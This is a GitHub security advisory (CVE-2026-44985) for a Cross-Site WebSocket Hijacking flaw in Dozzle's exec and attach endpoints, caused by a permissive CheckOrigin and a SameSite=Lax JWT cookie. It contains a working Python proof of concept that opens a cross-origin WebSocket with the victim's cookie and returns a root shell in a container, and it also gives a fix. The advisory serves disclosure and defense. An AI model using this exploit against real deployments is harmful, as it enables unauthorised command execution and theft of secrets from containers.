# [H] Dozzle's Cross-Site WebSocket Hijacking (CSWSH) on exec/attach endpointsbypasses authentication

## Summary
Severity: High
Advisory: GHSA-j643-x8pv-8m67
CVE: CVE-2026-44985
CWE: CWE-346
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-j643-x8pv-8m67
Type: github-advisory

## Affected
- Go: `github.com/amir20/dozzle` — affected >=0

## Details
## Summary

The WebSocket upgrader for the `/exec` and `/attach` endpoints uses `CheckOrigin: func(r *http.Request) bool { return true }`, accepting upgrade requests from any origin. Combined with the JWT cookie using `SameSite: Lax`, this enables Cross-Site WebSocket Hijacking (CSWSH) — **even when authentication is properly configured**.

An attacker hosting a page on a same-site origin (e.g., a sibling subdomain, or another service on localhost) can initiate a WebSocket connection to the exec endpoint that carries the victim's valid JWT cookie, gaining interactive shell access in any container the victim is authorized to access.

## Root cause

**1. CheckOrigin bypassed (`internal/web/terminal.go:15-21`)**

```go
var upgrader = websocket.Upgrader{
    ReadBufferSize:  1024,
    WriteBufferSize: 1024,
    CheckOrigin: func(r *http.Request) bool {
        return true
    },
}
```

The gorilla/websocket default CheckOrigin rejects cross-origin requests. Overriding it to return `true` removes the only server-side defense against CSWSH.

**2. JWT cookie with SameSite=Lax (`internal/web/auth.go:20-27`)**

```go
http.SetCookie(w, &http.Cookie{
    Name:     "jwt",
    Value:    token,
    HttpOnly: true,
    Path:     "/",
    SameSite: http.SameSiteLaxMode,
    Expires:  expires,
})
```

`SameSite` operates at the **site** level (eTLD+1), not the origin level. A page on `evil.example.com` can make a WebSocket request to `dozzle.example.com` and the browser will attach the JWT cookie, because they share the same site (`example.com`). `SameSite=Lax` only blocks cross-**site** requests (different eTLD+1), not cross-**origin** requests within the same site.

## Attack scenario

Preconditions: Dozzle is deployed with `--enable-shell` and authentication configured (simple auth). The victim is logged in.

1. Attacker controls a page on the same site (e.g., `attacker.example.com`, or another service on `localhost:8888` while Dozzle is on `localhost:9090`)
2. Victim visits the attacker's page while authenticated to Dozzle
3. Attacker's JavaScript opens `new WebSocket('wss://dozzle.example.com/api/hosts/{host}/containers/{id}/exec')`
4. Browser sends the JWT cookie (same-site, `SameSite=Lax` allows it)
5. Dozzle's `CheckOrigin` returns `true` — upgrade accepted
6. Auth middleware validates the JWT from the cookie — request authenticated
7. Attacker has a shell in the victim's authorized containers

## PoC (auth enabled)

**Setup — Dozzle with authentication + shell:**

docker-compose.yml:
```yaml
services:
  dozzle:
    image: amir20/dozzle:latest
    ports:
      - "9090:8080"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./data:/data
    environment:
      - DOZZLE_AUTH_PROVIDER=simple
      - DOZZLE_ENABLE_SHELL=true

  target:
    image: alpine:latest
    command: sh -c "while true; do sleep 3600; done"
```

data/users.yml:
```yaml
users:
  admin:
    name: Admin
    # password: admin123
    password: "$2b$11$NdL2aePdZmwFzqGo5YYqaOwG.26CjSlnzU3VQNTEGnT0ewbds2JNS"
    email: admin@test.local
    roles: shell
```

**Exploit — CSWSH with cross-origin Origin header + victim's cookie:**

```python
import json, time, websocket, requests

target = "http://localhost:9090"

# Verify auth is enabled
r = requests.get(f"{target}/api/events/stream", timeout=5, stream=True)
r.close()
assert r.status_code == 401, "Auth not enabled"

# Victim logs in
r = requests.post(f"{target}/api/token", data={"username": "admin", "password": "admin123"})
jwt = r.headers["Set-Cookie"].split("jwt=")[1].split(";")[0]

# Get container info (authenticated)
r = requests.get(f"{target}/api/events/stream", cookies={"jwt": jwt}, stream=True, timeout=10)
for line in r.iter_lines(decode_unicode=True):
    if line and line.startswith("data: "):
        data = json.loads(line[6:])
        if isinstance(data, list) and len(data) > 0 and "host" in data[0]:
            host_id = data[0]["host"]
            cid = data[0]["id"]
            break
r.close()

# CSWSH: cross-origin WebSocket with victim's cookie
ws_url = f"ws://localhost:9090/api/hosts/{host_id}/containers/{cid}/exec"
ws = websocket.create_connection(
    ws_url, timeout=10,
    cookie=f"jwt={jwt}",
    origin="http://localhost:8888"  # DIFFERENT origin
)
# Connected! CheckOrigin:true accepted the cross-origin request

ws.send(json.dumps({"type": "resize", "width": 120, "height": 40}))
time.sleep(1); ws.recv()

ws.send(json.dumps({"type": "userinput", "data": "id\n"}))
time.sleep(2)
ws.settimeout(2)
output = []
try:
    while True:
        output.append(ws.recv())
except:
    pass
ws.close()
print("".join(output))
# uid=0(root) gid=0(root) groups=0(root)

# Verify: without cookie = rejected
try:
    ws2 = websocket.create_connection(ws_url, timeout=5, origin="http://localhost:8888")
    ws2.close()
except Exception as e:
    print(f"Without cookie: {e}")  # 401 Unauthorized
```

**Result:**
```
[+] Auth is ENABLED (events stream returns 401)
[+] WebSocket CONNECTED with cross-origin Origin: http://localhost:8888
[+] uid=0(root) gid=0(root) groups=0(root)
[+] Without cookie -> 401 Unauthorized
```

## Impact

Users who deploy Dozzle with `--enable-shell` and properly configure authentication are still vulnerable to CSWSH. An attacker on a same-site origin can hijack the authenticated WebSocket to:

- Execute arbitrary commands in any container the victim has access to
- Read secrets, environment variables, and files inside containers
- Pivot to other services accessible from the container network
- Potentially escape to the Docker host if the socket is mounted writable

## Suggested fix

Remove the custom `CheckOrigin` override and use the gorilla/websocket default, which rejects cross-origin requests:

```go
var upgrader = websocket.Upgrader{
    ReadBufferSize:  1024,
    WriteBufferSize: 1024,
    // Default CheckOrigin rejects cross-origin requests
}
```

## References
- https://github.com/amir20/dozzle/security/advisories/GHSA-j643-x8pv-8m67
- https://nvd.nist.gov/vuln/detail/CVE-2026-44985
- https://github.com/amir20/dozzle
- https://github.com/amir20/dozzle/releases/tag/v10.5.2
